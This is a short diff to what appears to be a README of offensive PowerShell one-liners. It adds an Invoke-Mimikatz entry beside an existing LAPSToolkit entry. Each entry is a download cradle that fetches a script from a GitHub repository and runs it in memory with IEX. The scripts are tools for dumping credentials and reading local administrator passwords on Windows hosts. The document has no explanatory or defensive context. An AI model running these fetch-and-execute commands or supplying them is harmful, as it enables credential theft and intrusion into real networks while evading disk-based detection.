@@ -20,3 +20,8 @@ LAPSToolkit
 ```powershell
 (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/wez3/reflective-loading/main/LAPSToolkit.ps1') | IEX
 ```
+
+Invoke-Mimikatz
+```powershell
+(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/wez3/reflective-loading/main/Invoke-Mimikatz.ps1') | IEX
+```
